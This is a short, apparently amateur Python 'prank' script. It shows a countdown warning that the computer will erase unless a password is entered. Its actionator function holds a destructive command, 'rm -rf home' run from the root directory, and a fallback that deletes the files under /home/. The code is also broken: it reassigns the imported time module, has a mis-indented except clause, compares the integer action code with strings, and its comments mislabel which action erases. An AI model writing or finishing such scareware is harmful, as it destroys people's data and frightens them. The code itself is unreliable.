import os
import time
# vars
password = 123
instance = 1
action = 3
# instances
# 1 - only one ime for input
# 2 - two times for input
# 3 - three times for input
# actions
# 1 - shutdown
# 2 - erase
# 3 - just a prank (always fails)
def clear():
  os.system("clear")
clear()
def secprint(total):
  totaltime = total
  while total != 0:
    print(f"enter password or this computer will erase in {total} seconds")
    time.sleep(1)
    total -=1
    time += 1
    if time == totaltime:
      actionator(action)
    clear()
def actionator(acode,attempt=None):
  if acode == "1":
    os.system("cd /")
    try:
      os.system("rm -rf home")
     except:
      dir = '/home/'
      for f in os.listdir(dir):
        os.remove(os.path.join(dir, f))
  if acode == "2":
    print("WIP")
while instance != 0:
  secprint(instance)
  instance = 0
